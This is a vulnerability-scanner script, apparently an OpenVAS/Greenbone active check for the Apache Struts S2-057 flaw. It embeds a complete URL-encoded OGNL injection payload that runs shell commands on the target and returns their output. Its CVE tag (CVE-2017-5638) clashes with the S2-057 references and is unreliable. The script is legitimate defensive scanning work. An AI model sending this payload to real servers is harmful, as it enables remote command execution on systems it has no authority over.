# Copyright (C) 2018 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141398");
  script_version("2021-04-01T08:55:18+0000");
  script_tag(name:"last_modification", value:"2021-04-01 10:13:05 +0000 (Thu, 01 Apr 2021)");
  script_tag(name:"creation_date", value:"2018-08-27 13:07:39 +0700 (Mon, 27 Aug 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2017-5638");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache Struts RCE Vulnerability (S2-057) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("www/action_jsp_do");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution
  (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the
  response.");

  script_tag(name:"insight", value:"The flaw exists due to errors in conditions when
  namespace value isn't set for a result defined in underlying configurations and in same
  time, its upper action(s) configurations have no or wildcard namespace. Same possibility
  when using url tag which doesn't have value and action set and in same time, its upper
  action(s) configurations have no or wildcard namespace.");

  script_tag(name:"affected", value:"Apache Struts 2.3 through 2.3.34 and 2.5 through
  2.5.16.");

  script_tag(name:"solution", value:"Update to version 2.3.35, 2.5.17 or later.");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-057");
  script_xref(name:"URL", value:"https://semmle.com/news/apache-struts-CVE-2018-11776");
  script_xref(name:"URL", value:"https://lgtm.com/blog/apache_struts_CVE-2018-11776");
  script_xref(name:"Advisory-ID", value:"S2-057");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default: 80);
host = http_host_name(dont_add_port: TRUE);

urls = make_list();

exts = http_get_kb_file_extensions(port: port, host: host, ext: "action");
if (exts && is_array(exts))
  urls = make_list(urls, exts);

cmds = exploit_commands();

foreach url (urls) {
  path = eregmatch(pattern: "(.*/)([^.]+\.action)", string: url);
  if (isnull(path[2]))
    continue;

  action = path[2];
  dir = path[1];

  foreach cmd (keys(cmds)) {
    url_check = dir + "%24%7B%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29." +
                      "%28%23cmd%3D%27" + cmds[cmd] + "%27%29.%28%23iswin%3D%28%40" +
                      "java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27" +
                      "win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B" +
                      "%27bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder" +
                      "%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start" +
                      "%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse" +
                      "%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy" +
                      "%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/" + action;

    if (http_vuln_check(port: port, url: url_check, pattern: cmd, check_header: TRUE)) {
      report = http_report_vuln_url(port: port, url: url_check);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(0);
